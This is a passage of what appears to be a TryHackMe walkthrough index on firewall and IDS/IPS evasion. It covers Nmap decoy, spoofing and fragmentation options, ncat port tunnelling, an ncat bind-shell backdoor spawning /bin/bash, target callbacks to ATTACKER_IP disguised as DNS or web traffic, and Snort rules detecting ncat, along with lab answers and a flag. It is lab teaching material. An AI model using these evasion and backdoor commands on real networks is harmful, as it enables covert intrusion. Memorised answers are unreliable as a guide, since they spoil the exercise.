MACHINE_IP ? Approximate to the nearest 100, such as 100, 200, 300, etc. Ans: 200","title":"Task 3: Evasion via Controlling the Source MAC/IP/Port"},{"location":"tryhackme/room/l/redteamfirewalls/#decoys","text":"Hide your scan with decoys. Using decoys makes your IP address mix with other \u201cdecoy\u201d IP addresses. Consequently, it will be difficult for the firewall and target host to know where the port scan is coming from. Moreover, this can exhaust the blue team investigating each source IP address. Using the -D option, you can add decoy source IP addresses to confuse the target. Consider the following command, nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP . The Wireshark capture is shown in the following figure. The target MACHINE_IP will also see scans coming from 10.10.10.1 and 10.10.10.2 when only one source IP address, ME, is running the scan. Note that if you omit the ME entry in the scan command, Nmap will put your real IP address, i.e. ME, in a random position. You can also set Nmap to use random source IP addresses instead of explicitly specifying them. By running nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP , Nmap will choose two random source IP addresses to use as decoys. Nmap will use new random IP addresses each time you run this command. In the screenshot below, we see how Nmap picked two random IP addresses in addition to our own, 10.14.17.226 . Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -Pn -D RND,10.10.55.33,ME,RND -F MACHINE_IP ? Approximate to the nearest 100, such as 100, 200, 300, etc. Ans: 800","title":"Decoy(s)"},{"location":"tryhackme/room/l/redteamfirewalls/#proxy","text":"Use an HTTP/SOCKS4 proxy. Relaying the port scan via a proxy helps keep your IP address unknown to the target host. This technique allows you to keep your IP address hidden while the target logs the IP address of the proxy server. You can go this route using the Nmap option --proxies PROXY_URL . For example, nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP will send all its packets via the proxy server you specify. Note that you can chain proxies using a comma-separated list. What do you expect the target to see as the source of the scan when you run the command nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP Ans: 10.10.13.37","title":"Proxy"},{"location":"tryhackme/room/l/redteamfirewalls/#spoofed-mac-address","text":"Spoof the source MAC address. Nmap allows you to spoof your MAC address using the option --spoof-mac MAC_ADDRESS . This technique is tricky; spoofing the MAC address works only if your system is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If you are not on the same network segment, sharing the same Ethernet, you won\u2019t be able to capture and read the responses. It allows you to exploit any trust relationship based on MAC addresses. Moreover, you can use this technique to hide your scanning activities on the network. For example, you can make your scans appear as if coming from a network printer. What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, 00:02:DC ? Ans: Fujitsu General Ltd Visit https://maclookup.app/macaddress/0002DC/mac-address-details","title":"Spoofed MAC Address"},{"location":"tryhackme/room/l/redteamfirewalls/#spoofed-ip-address","text":"Spoof the source IP address. Nmap lets you spoof your IP address using -S IP_ADDRESS . Spoofing the IP address is useful if your system is on the same subnetwork as the target host; otherwise, you won\u2019t be able to read the replies sent back. The reason is that the target host will reply to the spoofed IP address, and unless you can capture the responses, you won\u2019t benefit from this technique. Another use for spoofing your IP address is when you control the system that has that particular IP address. Consequently, if you notice that the target started to block the spoofed IP address, you can switch to a different spoofed IP address that belongs to a system that you also control. This scanning technique can help you maintain stealthy existence; moreover, you can use this technique to exploit trust relationships on the network based on IP addresses. To mislead the opponent, you decided to make your port scans appear as if coming from a local access point that has the IP address 10.10.0.254 . What option needs to be added to your Nmap command to spoof your address accordingly? Ans: -S 10.10.0.254","title":"Spoofed IP Address"},{"location":"tryhackme/room/l/redteamfirewalls/#fixed-source-port-number","text":"Use a specific source port number. Scanning from one particular source port number can be helpful if you discover that the firewalls allow incoming packets from particular source port numbers, such as port 53 or 80. Without inspecting the packet contents, packets from source TCP port 80 or 443 look like packets from a web server, while packets from UDP port 53 look like responses to DNS queries. You can set your port number using -g or --source-port options. The following Wireshark screenshot shows a Nmap scan with the fixed source TCP port number 8080. We have used the following Nmap command, nmap -sS -Pn -g 8080 -F MACHINE_IP . You can see in the screenshot how it is that all the TCP connections are sent from the same TCP port number. You decide to use Nmap to scan for open UDP ports. You notice that using nmap -sU -F MACHINE_IP to discover the open common UDP ports won\u2019t give you any meaningful results. What do you need to add to your Nmap command to set the source port number to 53? Ans: -g 53 This is a quick summary of the Nmap options discussed in this task. Evasion Approach Nmap Argument Hide a scan with decoys -D DECOY1_IP1,DECOY_IP2,ME Hide a scan with random decoys -D RND,RND,ME Use an HTTP/SOCKS4 proxy to relay connections --proxies PROXY_URL Spoof source MAC address --spoof-mac MAC_ADDRESS Spoof source IP address -S IP_ADDRESS Use a specific source port number -g PORT_NUM or --source-port PORT_NUM","title":"Fixed Source Port Number"},{"location":"tryhackme/room/l/redteamfirewalls/#task-4-evasion-via-forcing-fragmentation-mtu-and-data-length","text":"You can control the packet size as it allows you to: Fragment packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it. Send packets with specific data lengths. Answer the questions bellow","title":"Task 4: Evasion via Forcing Fragmentation, MTU, and Data Length"},{"location":"tryhackme/room/l/redteamfirewalls/#fragment-your-packets-with-8-bytes-of-data","text":"One easy way to fragment your packets would be to use the -f option. This option will fragment the IP packet to carry only 8 bytes of data. As mentioned earlier, running a Nmap TCP port scan means that the IP packet will hold 24 bytes, the TCP header. If you want to limit the IP data to 8 bytes, the 24 bytes of the TCP header will be divided across 3 IP packets. And this is precisely what we obtained when we ran this Nmap scan, nmap -sS -Pn -f -F MACHINE_IP . As we can see in the Wireshark capture in the figure below, each IP packet is fragmented into three packets, each with 8 bytes of data. What is the size of the IP packet when running Nmap with the -f option? Ans: 28","title":"Fragment Your Packets with 8 Bytes of Data"},{"location":"tryhackme/room/l/redteamfirewalls/#fragment-your-packets-with-16-bytes-of-data","text":"Another handy option is the -ff , limiting the IP data to 16 bytes. (One easy way to remember this is that one f is 8 bytes, but two f s are 16 bytes.) By running nmap -sS -Pn -ff -F MACHINE_IP , we expect the 24 bytes of the TCP header to be divided between two IP packets, 16 + 8, because -ff has put an upper limit of 16 bytes. The first few packets are shown in the Wireshark capture below. What is the maximum size of the IP packet when running Nmap with the -ff option? Ans: 36","title":"Fragment Your Packets with 16 Bytes of Data"},{"location":"tryhackme/room/l/redteamfirewalls/#fragment-your-packets-according-to-a-set-mtu","text":"Another neat way to fragment your packets is by setting the MTU. In Nmap, --mtu VALUE specifies the number of bytes per IP packet. In other words, the IP header size is not included. The value set for MTU must always be a multiple of 8. Note that the Maximum Transmission Unit (MTU) indicates the maximum packet size that can pass on a certain link-layer connection. For instance, Ethernet has an MTU of 1500, meaning that the largest IP packet that can be sent over an Ethernet (link layer) connection is 1500 bytes. Please don\u2019t confuse this MTU with the --mtu in Nmap options. Running Nmap with --mtu 8 will be identical to -f as the IP data will be limited to 8 bytes. The first few packets generated by this Nmap scan nmap -sS -Pn --mtu 8 -F MACHINE_IP are shown in the following Wireshark capture. What is the maximum size of the IP packet when running Nmap with --mtu 36 option? Ans: 56","title":"Fragment Your Packets According to a Set MTU"},{"location":"tryhackme/room/l/redteamfirewalls/#generate-packets-with-specific-length","text":"In some instances, you might find out that the size of the packets is triggering the firewall or the IDS/IPS to detect and block you. If you ever find yourself in such a situation, you can make your port scanning more evasive by setting a specific length. You can set the length of data carried within the IP packet using --data-length VALUE . Again, remember that the length should be a multiple of 8. If you run the following Nmap scan nmap -sS -Pn --data-length 64 -F MACHINE_IP , each TCP segment will be padded with random data till its length is 64 bytes. In the screenshot below, we can see that each TCP segment has a length of 64 bytes. What is the maximum size of the IP packet when running Nmap with --data-length 128 option? Ans: 148 This is a quick summary of the Nmap options discussed in this task. Evasion Approach Nmap Argument Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Fragment packets with given MTU --mtu VALUE Specify packet length --data-length NUM","title":"Generate Packets with Specific Length"},{"location":"tryhackme/room/l/redteamfirewalls/#task-5-evasion-via-modifying-header-fields","text":"Nmap allows you to control various header fields that might help evade the firewall. You can: Set IP time-to-live Send packets with specified IP options Send packets with a wrong TCP/UDP checksum","title":"Task 5: Evasion via Modifying Header Fields"},{"location":"tryhackme/room/l/redteamfirewalls/#set-ttl","text":"Nmap gives you further control over the different fields in the IP header. One of the fields you can control is the Time-to-Live (TTL). Nmap options include --ttl VALUE to set the TTL to a custom value. This option might be useful if you think the default TTL exposes your port scan activities. In the following screenshot, we can see the packets captured by Wireshark after using a custom TTL as we run our scan, nmap -sS -Pn --ttl 81 -F MACHINE_IP . As with the previous examples, the packets below are captured on the same system running Nmap. Answer the questions bellow Start the AttackBox and the machine attached to this task. After you give them time to load fully, scan the attached MS Windows machine using --ttl 1 option. Check the number of ports that appear to be open. The answer will vary depending on whether you are using the AttackBox or connecting over VPN. We suggest you try both. Question: Scan the attached MS Windows machine using --ttl 2 option. How many ports appear to be open? Ans: 3","title":"Set TTL"},{"location":"tryhackme/room/l/redteamfirewalls/#set-ip-options","text":"One of the IP header fields is the IP Options field. Nmap lets you control the value set in the IP Options field using --ip-options HEX_STRING, where the hex string can specify the bytes you want to use to fill in the IP Options field. Each byte is written as \\xHH, where HH represents two hexadecimal digits, i.e., one byte. A shortcut provided by Nmap is using the letters to make your requests: R to record-route. T to record-timestamp. U to record-route and record-timestamp. L for loose source routing and needs to be followed by a list of IP addresses separated by space. S for strict source routing and needs to be followed by a list of IP addresses separated by space. The loose and strict source routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system.","title":"Set IP Options"},{"location":"tryhackme/room/l/redteamfirewalls/#use-a-wrong-checksum","text":"Another trick you can use is to send your packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others won\u2019t. You can use this to your advantage to discover more about the systems in your network. All you need to do is add the option --badsum to your Nmap command. Using nmap -sS -Pn --badsum -F MACHINE_IP , we scanned our target using intentionally incorrect TCP checksums. The target dropped all our packets and didn\u2019t respond to any of them. Pentester Terminal pentester @TryHackMe # nmap -sS -Pn --badsum -F MACHINE_IP Host discovery disabled ( -Pn ). All addresses will be marked 'up' and scan times will be slower . Starting Nmap 7 . 91 ( https :// nmap . org ) at 2022 - 01 - 28 16 : 07 EET Nmap scan report for MACHINE_IP Host is up . All 100 scanned ports on MACHINE_IP are filtered Nmap done : 1 IP address ( 1 host up ) scanned in 21 . 31 seconds The screenshot below shows the packets captured by Wireshark on the system running Nmap. Wireshark can be optionally set to verify the checksums, and we can notice how it highlights the errors. Question: Scan the attached MS Windows machine using the --badsum option. How many ports appear to be open? Ans: 0 Alt text This is a quick summary of the Nmap options discussed in this task. Evasion Approach Nmap Argument Set IP time-to-live field --ttl VALUE Send packets with specified IP options --ip-options OPTIONS Send packets with a wrong TCP/UDP checksum --badsum","title":"Use a Wrong Checksum"},{"location":"tryhackme/room/l/redteamfirewalls/#task-6-evasion-using-port-hopping","text":"Three common firewall evasion techniques are: Port hopping Port tunneling Use of non-standard ports Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some \u201clegitimate\u201d applications use this technique to evade firewalls. In the following figure, the client kept trying different ports to reach the server till it discovered a destination port not blocked by the firewall. There is another type of port hopping where the application establishes the connection on one port and starts transmitting some data; after a while, it establishes a new connection on (i.e., hopping to) a different port and resumes sending more data. The purpose is to make it more difficult for the blue team to detect and track all the exchanged traffic. On the AttackBox, you can use the command ncat -lvnp PORT_NUMBER to listen on a certain TCP port. -l listens for incoming connections -v provides verbose details (optional) -n does not resolve hostnames via DNS (optional) -p specifies the port number to use -lvnp PORT_NUMBER listens on TCP port PORT_NUMBER . If the port number is less than 1024, you need to run ncat as root. For example, run ncat -lvnp 1025 on the AttackBox to listen on TCP port 1025, as shown in the terminal output below. Pentester Terminal pentester @TryHackMe $ ncat -lvnp 1025 Ncat : Version 7 . 91 ( https :// nmap . org / ncat ) Ncat : Listening on ::: 1025 Ncat : Listening on 0 . 0 . 0 . 0 : 1025 We want to test if the target machine can connect to the AttackBox on TCP port 1025. By browsing to http://MACHINE_IP:8080 , you will be faced with a web page that lets you execute commands on the target machine. Note that in a real-case scenario, you might be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code of your choice. In this lab, you can simply run a Linux command by submitting it on the provided form at http://MACHINE_IP:8080 . We can use Netcat to connect to the target port using the command ncat IP_ADDRSS PORT_NUMBER . For instance, we can run ncat ATTACKBOX_IP 1024 to connect to the AttackBox at TCP port 1024. We want to check if the firewall is configured to allow connections. If the connection from the machine, with IP address MACHINE_IP , can pass through the firewall, we will be notified of the successful connection on the AttackBox terminal as shown below. Pentester Terminal pentester @TryHackMe $ ncat -lvnp 1025 Ncat : Version 7 . 91 ( https :// nmap . org / ncat ) Ncat : Listening on ::: 1025 Ncat : Listening on 0 . 0 . 0 . 0 : 1025 Ncat : Connection from 10 . 10 . 30 . 130 . Ncat : Connection from 10 . 10 . 30 . 130 : 51292 . Answer the questions bellow Using this simple technique, discover which port number of the following destination TCP port numbers are reachable from the protected system. - 21 - 23 - 25 - 26 - 27 Ans: 21","title":"Task 6: Evasion Using Port Hopping"},{"location":"tryhackme/room/l/redteamfirewalls/#task-7-evasion-using-port-tunneling","text":"Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system.","title":"Task 7: Evasion Using Port Tunneling"},{"location":"tryhackme/room/l/redteamfirewalls/#port-tunneling-using-ncat","text":"Consider the case where you have a server behind the firewall that you cannot access from the outside. However, you discovered that the firewall does not block specific port(s). You can use this knowledge to your advantage by tunneling the traffic via a different port. Consider the following case. We have an SMTP server listening on port 25; however, we cannot connect to the SMTP server because the firewall blocks packets from the Internet sent to destination port 25. We discover that packets sent to destination port 443 are not blocked, so we decide to take advantage of this and send our packets to port 443, and after they pass through the firewall, we forward them to port 25. Let\u2019s say that we can run a command of our choice on one of the systems behind the firewall. We can use that system to forward our packets to the SMTP server using the following command. ncat -lvnp 443 -c \"ncat TARGET_SERVER 25\" The command ncat uses the following options: -lvnp 443 listens on TCP port 443. Because the port number is less than 1024, you need to run ncat as root in this case. -c or --sh-exec executes the given command via /bin/sh . \"ncat TARGET_SERVER 25\" will connect to the target server at port 25. As a result, ncat will listen on port 443, but it will forward all packets to port 25 on the target server. Because in this case, the firewall is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade the firewall. Answer the questions bellow We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We\u2019re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag. Ans: THM{1298331956}","title":"Port Tunneling Using ncat"},{"location":"tryhackme/room/l/redteamfirewalls/#task-8-evasion-using-non-standard-ports","text":"ncat -lvnp PORT_NUMBER -e /bin/bash will create a backdoor via the specified port number that lets you interact with the Bash shell. -e or --exec executes the given command /bin/bash location of the command we want to execute On the AttackBox, we can run ncat MACHINE_IP PORT_NUMBER to connect to the target machine and interact with its shell. Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. Moreover, unless we run ncat as a privileged user, root , or using sudo , we cannot use port numbers below 1024. Answer the questions bellow We\u2019re continuing to use the web-form from Task 6 to set up the ncat listener. Knowing that the firewall does not block packets to destination port 8081, use ncat to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in? Ans: thmredteam","title":"Task 8: Evasion Using Non-Standard Ports"},{"location":"tryhackme/room/l/redteamfirewalls/#task-9-next-generation-firewalls","text":"Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS. Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include: Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time. Identify users and their traffic. It can enforce the security policy per-user or per-group basis. Identify the applications and protocols regardless of the port number being used. Identify the content being transmitted. It can enforce the security policy in case any violating content is detected. Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files. A properly configured and deployed NGFW renders many attacks useless. Answer the questions bellow What is the number of the highest OSI layer that an NGFW can process? Ans: 7","title":"Task 9: Next-Generation Firewalls"},{"location":"tryhackme/room/l/redteamfirewalls/#task-10-conclusion","text":"This room covered the different types of firewalls and the common evasion techniques. Correctly understanding the limitations of the firewall technology you are targeting helps you pick and construct suitable firewall evasion processes. This room demonstrated different evasion techniques using ncat ; however, the same results can be achieved using a different tool, such as socat . It is recommended to check out the What the Shell ? room. The following table summarizes the Nmap arguments covered in this room. Evasion Approach Nmap Argument Hide a scan with decoys -D DECOY1_IP1,DECOY_IP2,ME Use an HTTP/SOCKS4 proxy to relay connections --proxies PROXY_URL Spoof source MAC address --spoof-mac MAC_ADDRESS Spoof source IP address -S IP_ADDRESS Use a specific source port number -g PORT_NUM or --source-port PORT_NUM Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Fragment packets with given MTU --mtu VALUE Specify packet length --data-length NUM Set IP time-to-live field --ttl VALUE Send packets with specified IP options --ip-options OPTIONS Send packets with a wrong TCP/UDP checksum --badsum","title":"Task 10: Conclusion"},{"location":"tryhackme/room/l/redteamnetsec/","text":"Network Security Solutions \u00b6 Task 1: Introduction \u00b6 An Intrusion Detection System (IDS) is a system that detects network or system intrusions. One analogy that comes to mind is a guard watching live feeds from different security cameras. He can spot a theft, but he cannot stop it by himself. However, if this guard can contact another guard and ask them to stop the robber, detection turns into prevention. An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent intrusions. Understanding the difference between detection and prevention is essential. Snort is a network intrusion detection and intrusion prevention system. Consequently, Snort can be set up as an IDS or an IPS. For Snort to function as an IPS, it needs some mechanism to block ( drop ) offending connections. This capability requires Snort to be set up as inline and to bridge two or more network cards. As a signature-based network IDS, Snort is shown in the figure below. The following figure shows how Snort can be configured as an IPS if set up inline. IDS setups can be divided based on their location in the network into: Host-based IDS (HIDS) Network-based IDS (NIDS) The host-based IDS (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host. The network-based IDS (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic. In the figure below, we use two red circles to show the difference in the coverage of a HIDS versus a NIDS. Answer the questions bellow Question: What does an IPS stand for? Ans: Intrusion Prevention System Question: What do you call a system that can detect malicious activity but not stop it? Ans: Intrusion Detection System Task 2: IDS Engine Types \u00b6 We can classify network traffic into: Benign traffic : This is the usual traffic that we expect to have and don\u2019t want the IDS to alert us about. Malicious traffic : This is abnormal traffic that we don\u2019t expect to see under normal conditions and consequently want the IDS to detect it. In the same way that we can classify network traffic, we can also classify host activity. The IDS detection engine is either built around detecting malicious traffic and activity or around recognizing normal traffic and activity. Recognizing \u201cnormal\u201d makes it easy to detect any deviation from normal. Consequently, the detection engine of an IDS can be: Signature-based : A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against. Anomaly-based : This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to \u201cteach\u201d the IDS what normal is so that it can recognize what is not normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules. Put in another way, signature-based IDS recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus. An anomaly-based IDS recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what \u201cnormal\u201d is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browser\u2019s performance deviated from normal. Answer the questions bellow Question: What kind of IDS engine has a database of all known malicious packets\u2019 contents? Ans: Signature-based Question: What kind of IDS engine needs to learn what normal traffic looks like instead of malicious traffic? Ans: Anomaly-based Question: What kind of IDS engine needs to be updated constantly as new malicious packets and activities are discovered? Ans: Signature-based Task 3: IDS/IPS Rule Triggering \u00b6 Each IDS/IPS has a certain syntax to write its rules. For example, Snort uses the following format for its rules: Rule Header (Rule Options) , where Rule Header constitutes: Action: Examples of action include alert , log , pass , drop , and reject . Protocol: TCP , UDP , ICMP , or IP . Source IP/Source Port: !10.10.0.0/16 any refers to everything not in the class B subnet 10.10.0.0/16 . Direction of Flow: -> indicates left (source) to right (destination), while <> indicates bi-directional traffic. Destination IP/Destination Port: 10.10.0.0/16 any to refer to class B subnet 10.10.0.0/16 . Below is an example rule to drop all ICMP traffic passing through Snort IPS: drop icmp any any -> any any (msg: \"ICMP Ping Scan\"; dsize:0; sid:1000020; rev: 1;) The rule above instructs the Snort IPS to drop any packet of type ICMP from any source IP address (on any port) to any destination IP address (on any port). The message to be added to the logs is \u201cICMP Ping Scan.\u201d Let\u2019s consider a hypothetical case where a vulnerability is discovered in our web server. This vulnerability lies in how our web server handles HTTP POST method requests, allowing the attacker to run system commands. Let\u2019s consider the following \u201cnaive\u201d approach. We want to create a Snort rule that detects the term ncat in the payload of the traffic exchanged with our webserver to learn how people exploit this vulnerability. alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; content:\"ncat\"; sid: 1000030; rev:1;) The rule above inspects the content of the packets exchanged with port 80 for the string ncat . Alternatively, you can choose to write the content that Snort will scan for in hexadecimal format. ncat in ASCII is written as 6e 63 61 74 in hexadecimal and it is encapsulated as a string by 2 pipe characters | . alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; content:\"|6e 63 61 74|\"; sid: 1000031; rev:1;) We can further refine it if we expect to see it in HTTP POST requests. Note that flow:established tells the Snort engine to look at streams started by a TCP 3-way handshake (established connections). alert tcp any any <> any 80 (msg: \"Netcat Exploitation\"; flow:established,to_server; content:\"POST\"; nocase; http_method; content:\"ncat\"; nocase; sid:1000032; rev:1;) If ASCII logging is chosen, the logs would be similar to the two alerts shown next. Snort Logs [**] [ 1 : 1000031 : 1 ] Netcat Exploitation [**] [ Priority : 0 ] 01 / 14 - 12 : 51 : 26 . 717401 10 . 14 . 17 . 226 : 45480 -> 10 . 10 . 112 . 168 : 80 TCP TTL : 63 TOS : 0x0 ID : 34278 IpLen : 20 DgmLen : 541 DF *** AP *** Seq : 0x26B5C2F Ack : 0x0 Win : 0x0 TcpLen : 32 [**] [ 1 : 1000031 : 1 ] Netcat Exploitation [**] [ Priority : 0 ] 01 / 14 - 12 : 51 : 26 . 717401 10 . 14 . 17 . 226 : 45480 -> 10 . 10 . 112 . 168 : 80 TCP TTL : 63 TOS : 0x0 ID : 34278 IpLen : 20 DgmLen : 541 DF *** AP *** Seq : 0x26B5C2F Ack : 0xF1090882 Win : 0x3F TcpLen : 32 TCP Options ( 3 ) => NOP NOP TS : 2244530364 287085341 There are a few points to make about signature-based IDS and its rules. If the attacker made even the slightest changes to avoid using ncat verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based IDS or IPS is limited to how well-written and updated its signatures (rules) are. We discuss some evasion techniques in the next task. Answer the questions bellow Question: In the attached file, the logs show that a specific IP address has been detected scanning our system of IP address 10.10.112.168 . What is the IP address running the port scan? Ans: 10.14.17.226 Task 4: Evasion via Protocol Manipulation \u00b6 Evading a signature-based IDS/IPS requires that you manipulate your traffic so that it does not match any IDS/IPS signatures. Here are four general approaches you might consider to evade IDS/IPS systems. Evasion via Protocol Manipulation Evasion via Payload Manipulation Evasion via Route Manipulation Evasion via Tactical Denial of Service (DoS) This room focuses on evasion using nmap and ncat / socat . The evasion techniques related to Nmap are discussed in great detail in the Firewalls room. This room will emphasize ncat and socat where appropriate. We will expand on each of these approaches in its own task. Let\u2019s start with the first one. Evasion via protocol manipulation includes: Relying on a different protocol Manipulating (Source) TCP/UDP port Using session splicing (IP packet fragmentation) Sending invalid packets Rely on a Different Protocol \u00b6 The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don\u2019t create too much noise. We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure HTTP communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS. Consider the case where you are using Ncat . Ncat, by default, uses a TCP connection; however, you can get it to use UDP using the option -u . To listen using TCP, just issue ncat -lvnp PORT_NUM where port number is the port you want to listen to. to connect to an Ncat instance listening on a TCP port, you can issue ncat TARGET_IP PORT_NUM Note that: -l tells ncat to listen for incoming connections -v gets more verbose output as ncat binds to a source port and receives a connection -n avoids resolving hostnames -p specifies the port number that ncat will listen on As already mentioned, using -u will move all communications over UDP. To listen using UDP, just issue ncat -ulvnp PORT_NUM where port number is the port you want to listen to. Note that unless you add -u , ncat will use TCP by default. To connect to an Ncat instance listening on a UDP port, you can issue nc -u TARGET_IP PORT_NUM Consider the following two examples: Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI). Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI. Manipulate (Source) TCP/UDP Port \u00b6 Generally speaking, the TCP and UDP source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection, the port numbers are the primary indicator of the service used. In other words, network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyze the data carried by the TCP segments. Depending on the target security solution, you can make your port scanning traffic resemble web browsing or DNS queries. If you are using Nmap, you can add the option -g PORT_NUMBER (or --source-port PORT_NUMBER ) to make Nmap send all its traffic from a specific source port number. While scanning a target, use nmap -sS -Pn -g 80 -F MACHINE_IP to make the port scanning traffic appear to be exchanged with an HTTP server at first glance. If you are interested in scanning UDP ports, you can use nmap -sU -Pn -g 53 -F MACHINE_IP to make the traffic appear to be exchanged with a DNS server. Consider the case where you are using Ncat . You can try to camouflage the traffic as if it is some DNS traffic. On the attacker machine, if you want to use Ncat to listen on UDP port 53, as a DNS server would, you can use ncat -ulvnp 53 . On the target, you can make it connect to the listening server using ncat -u ATTACKER_IP 53 . Alternatively, you can make it appear more like web traffic where clients communicate with an HTTP server. On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use ncat -lvnp 80 . On the target, connect to the listening server using nc ATTACKER_IP 80 . Use Session Splicing (IP Packet Fragmentation) \u00b6 Another approach possible in IPv4 is IP packet fragmentation, i.e., session splicing. The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide your payload among multiple packets. Unless the IDS reassembles the packets, the rule won\u2019t be triggered. Nmap offers a few options to fragment packets. You can add: -f to set the data in the IP packet to 8 bytes. -ff to limit the data in the IP packet to 16 bytes at most. --mtu SIZE to provide a custom size for data carried within the IP packet. The size should be a multiple of 8. Suppose you want to force all your packets to be fragmented into specific sizes. In that case, you should consider using a program such as Fragroute . fragroute can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with ip_frag SIZE to fragment the IP data according to the provided size. The size should be a multiple of 8. For example, you can create a configuration file fragroute.conf with one line, ip_frag 16 , to fragment packets where IP data fragments don\u2019t exceed 16 bytes. Then you would run the command fragroute -f fragroute.conf HOST . The host is the destination to which we would send the fragmented packets it. Sending Invalid Packets \u00b6 Generally speaking, the response of systems to valid packets tends to be predictable. However, it can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge. Nmap makes it possible to create invalid packets in a variety of ways. In particular, two common options would be to scan the target using packets that have: Invalid TCP/UDP checksum Invalid TCP flags Nmap lets you send packets with a wrong TCP/UDP checksum using the option --badsum . An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program. Nmap also lets you send packets with custom TCP flags, including invalid ones. The option --scanflags lets you choose which flags you want to set. URG for Urgent ACK for Acknowledge PSH for Push RST for Reset SYN for Synchronize FIN for Finish For instance, if you want to set the flags Synchronize, Reset, and Finish simultaneously, you can use --scanflags SYNRSTFIN , although this combination might not be beneficial for your purposes. If you want to craft your packets with custom fields, whether valid or invalid, you might want to consider a tool such as hping3 . We will list a few example options to give you an idea of packet crafting using hping3 . -t or --ttl to set the Time to Live in the IP header -b or --badsum to send packets with a bad UDP/TCP checksum -S , -A , -P , -U , -F , -R to set the TCP SYN, ACK, PUSH, URG, FIN, and RST flags, respectively There is a myriad of other options. Depending on your needs, you might want to check the hping3 manual page for the complete list. Answer the questions bellow Question: We use the following Nmap command, nmap -sU -F MACHINE_IP , to launch a UDP scan against our target. What is the option we need to add to set the source port to 161? Ans: -g 161 Question: The target allows Telnet traffic. Using ncat , how do we set a listener on the Telnet port? Ans: ncat -lvnp 23 Question: We are scanning our target using nmap -sS -F MACHINE_IP . We want to fragment the IP packets used in our Nmap scan so that the data size does not exceed 16 bytes. What is the option that we need to add? Ans: 